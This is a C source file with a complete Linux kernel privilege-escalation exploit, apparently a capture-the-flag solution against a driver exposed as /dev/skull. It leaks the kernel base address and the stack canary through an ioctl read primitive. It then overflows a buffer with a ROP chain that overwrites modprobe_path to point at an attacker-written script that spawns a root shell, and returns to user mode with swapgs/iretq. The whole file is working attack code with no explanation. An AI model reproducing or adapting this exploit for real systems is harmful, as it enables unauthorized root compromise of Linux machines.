#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdint.h>

int fd;
unsigned long user_cs, user_ss, user_rsp, user_rflag;

struct request_t{
    void *dst;
    void *src;
};

void modprobe_setup(void){
    system("echo '#!/bin/sh\nsetsid cttyhack setuidgid root sh' > /home/blud/x");
    system("chmod +x /home/blud/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/blud/y");
    system("chmod +x /home/blud/y");
}

void save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflag;"
        ".att_syntax"
    );
}

int main(){
    struct request_t req;
    unsigned long kbase, modprobe, canary;

    save_state();
    modprobe_setup();

    fd = open("/dev/skull", O_RDWR);

    req.src = 0xfffffe0000000004;           // cpu_entry_area + 4  --> kernel .text
    req.dst = &kbase;
    ioctl(fd, 0x6969, &req);

    kbase = kbase - 0x1008e00;
    modprobe = kbase + 0x1b3f280;

    printf("kbase: 0x%lx\n", kbase);
    printf("modprobe: 0x%lx\n", modprobe);

    req.src = kbase + 0x1a3c0e0;
    req.dst = &canary;
    ioctl(fd, 0x6969, &req);

    req.src = canary + 0x3da0; 
    req.dst = &canary;
    ioctl(fd, 0x6969, &req);

    printf("canary: 0x%lx\n", canary);

    unsigned long buffer[50] = {0};
    int offset = 32;

    buffer[offset++] = canary;
    buffer[offset++] = kbase + 0x1c237;     // pop rax; ret
    buffer[offset++] = 0x6c622f656d6f682f;  // /home/bl
    buffer[offset++] = kbase + 0x90d14;     // pop rdi ; ret
    buffer[offset++] = modprobe;            // modprobe_path
    buffer[offset++] = kbase + 0x141bd8;    // mov qword ptr [rdi], rax; ret

    buffer[offset++] = kbase + 0x1c237;     // pop rax; ret
    buffer[offset++] = 0x782f6475;          // ud/x
    buffer[offset++] = kbase + 0x90d14;     // pop rdi ; ret
    buffer[offset++] = modprobe+8;          // modprobe_path + 8
    buffer[offset++] = kbase + 0x141bd8;    // mov qword ptr [rdi], rax; ret

    buffer[offset++] = kbase + 0xe75a58;    // swapgs
    buffer[offset++] = kbase + 0x36893;     // iretq
    buffer[offset++] = 0;                       
    buffer[offset++] = user_cs;
    buffer[offset++] = user_rflag;
    buffer[offset++] = user_rsp;
    buffer[offset++] = user_ss;

    write(fd, buffer, sizeof(buffer));
    return 0;
}
